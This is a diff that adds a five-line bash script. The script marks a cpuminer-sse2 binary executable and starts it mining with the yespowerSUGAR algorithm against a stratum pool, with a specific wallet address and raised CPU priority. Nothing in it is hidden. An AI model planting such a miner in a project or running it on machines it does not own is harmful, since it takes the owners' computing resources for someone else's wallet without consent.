@@ -1,0 +1,5 @@
+#!/bin/bash
+
+chmod +x cpuminer-sse2
+
+./cpuminer-sse2 --cpu-priority 5 -a yespowerSUGAR -o stratum+tcp://instapool.xyz:3032 -u sugar1qc37hjc58p2cu8pnw5phczhk80cvfw3as8kz2kp.ati -t2
